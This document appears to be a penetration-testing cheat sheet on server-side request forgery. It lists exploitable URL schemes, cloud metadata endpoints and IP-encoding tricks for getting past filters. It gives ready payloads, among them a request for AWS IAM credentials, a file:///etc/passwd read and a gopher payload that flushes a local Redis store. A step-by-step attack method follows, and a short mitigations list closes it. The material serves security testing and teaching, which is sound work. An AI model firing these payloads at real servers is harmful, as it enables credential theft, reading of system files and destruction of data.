# SSRF (SERVER-SIDE REQUEST FORGERY) PAYLOADS

SSRF tricks a server into making HTTP (or other protocol) requests on the attacker's behalf — to internal services, cloud metadata endpoints, or otherwise unreachable hosts — by supplying a malicious URL/host to a feature that fetches remote resources server-side (image preview, webhook, PDF generator, URL unfurling, import-from-URL, etc.).

## Protocol / Scheme Reference

| Scheme | Purpose |
|---|---|
| `http://` / `https://` | Standard web request — most common SSRF target |
| `file://` | Reads local files from the server's filesystem instead of making a network request |
| `gopher://` | Sends raw, arbitrary bytes over TCP — used to craft requests to non-HTTP services (Redis, SMTP, internal APIs) |
| `dict://` | Used to probe/interact with services that speak the DICT protocol, often abused for simple port scanning |
| `ftp://` | Occasionally usable for internal file listing/retrieval |
| `ldap://` | Can be abused to interact with internal LDAP services |

## Target Reference

| Target | Purpose |
|---|---|
| `http://127.0.0.1` / `http://localhost` | Loopback — accesses services only meant to be reachable from the server itself |
| `http://169.254.169.254/latest/meta-data/` | AWS cloud metadata endpoint — often leaks IAM credentials |
| `http://metadata.google.internal/computeMetadata/v1/` | GCP metadata endpoint equivalent |
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure metadata endpoint equivalent |
| `http://10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | Private/internal IP ranges — common internal service targets |
| `http://[::1]` | IPv6 loopback equivalent of `127.0.0.1` |

## Bypass Technique Reference

| Technique | Example | Why it works |
|---|---|---|
| Decimal IP encoding | `http://2130706433/` (= `127.0.0.1`) | Some filters only match the dotted-quad string `127.0.0.1`, not its decimal integer equivalent |
| Octal IP encoding | `http://0177.0.0.1/` | Same idea — filters checking literal string patterns miss alternate numeric bases |
| Hex IP encoding | `http://0x7f.0.0.1/` | Same idea, hex form |
| IPv6-mapped IPv4 | `http://[::ffff:127.0.0.1]/` | Filters that only check IPv4 literal patterns miss the IPv6-embedded form |
| Short-form/dotless IP | `http://127.1/` | Equivalent to `127.0.0.1`, but doesn't match a naive `127.0.0.1` string filter |
| DNS rebinding | Domain resolves to an allowed IP at validation time, then to an internal IP at request time | Defeats validate-then-fetch patterns where DNS isn't re-resolved consistently |
| URL parser confusion | `http://allowed-domain.com@169.254.169.254/` | Some parsers treat everything before `@` as userinfo and request the host after it instead |
| Open redirect chaining | `http://allowed-domain.com/redirect?to=http://169.254.169.254/` | If the SSRF filter only checks the initial URL, a redirect on an allowed domain can still land on an internal target |
| Double URL encoding | `http://169.254.169.254%2flatest%2fmeta-data%2f` | Defeats filters that only decode once before validating |
| Alternate schemes | `file:///etc/passwd`, `gopher://...` | Bypasses filters that only check for `http(s)://` prefixes |

## EXAMPLE PAYLOADS

```
http://127.0.0.1:8080/admin
```
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
```
http://2130706433/admin
```
```
http://allowed-domain.com@127.0.0.1/internal
```
```
file:///etc/passwd
```
```
gopher://127.0.0.1:6379/_*1%0d%0a%24%38%0d%0aflushall%0d%0a
```
*(gopher payload targets a local Redis instance with a raw `FLUSHALL` command — illustrates protocol smuggling via gopher)*

```
http://localhost:80@169.254.169.254/
```

## Where SSRF Hides (Common Vulnerable Features)

| Feature | Why it's exploitable |
|---|---|
| Image/file preview from URL | Server fetches the URL to generate a thumbnail or preview |
| Webhook/callback URL fields | Server makes an outbound request to whatever URL is configured |
| PDF/document generation from URL | Server-side renderer fetches external resources |
| URL unfurling / link preview (chat apps) | Server fetches metadata (title, og:image) from a supplied link |
| "Import from URL" features | Server fetches and ingests content from a remote URL |
| XML parsers with external entity support | XXE can be chained into SSRF via `SYSTEM` entity URLs |
| PDF-to-HTML / HTML-to-PDF converters | Often fetch embedded resources (images, stylesheets) server-side |

## Testing Methodology

1. Identify any feature that takes a URL/hostname as input and makes a server-side request to it.
2. Test basic redirection to `127.0.0.1`/`localhost` first — confirms SSRF exists at all.
3. If filtered, work through bypass techniques (encoding, alternate IP forms, redirect chaining) one at a time.
4. Probe internal IP ranges and common ports for open services once basic SSRF is confirmed.
5. Target cloud metadata endpoints if the app is hosted on AWS/GCP/Azure — high-value, well-known target.
6. If `gopher://` is allowed, consider crafting raw protocol payloads against internal services like Redis, Memcached, or internal HTTP APIs.

## Mitigations (for writeups)

- Maintain a strict allowlist of permitted destination hosts/IPs — never rely on a denylist alone.
- Resolve DNS once and validate the resolved IP before connecting; re-validate on redirect rather than trusting an initial check.
- Block requests to private/reserved IP ranges and link-local addresses (including `169.254.169.254`) at the network layer, not just in application code.
- Disable unnecessary URL schemes (`file://`, `gopher://`, `dict://`) in any URL-fetching library.
- Use a dedicated, network-isolated proxy for server-initiated outbound requests, rather than letting the app server make the request directly.
- Require authentication on cloud metadata endpoints where supported (e.g. AWS IMDSv2) to reduce SSRF-to-credential-theft impact.

## Quick Notes
- SSRF severity often comes from what it reaches, not the bug itself — cloud metadata access turning into full account/IAM compromise is the classic high-impact chain.
- Always test both **request-based** SSRF (response is reflected back) and **blind** SSRF (no visible response — confirm via DNS/HTTP interaction logging, like Burp Collaborator).
- Combine with port scanning (varying the port on an internal IP) to map what's reachable once basic SSRF is confirmed.
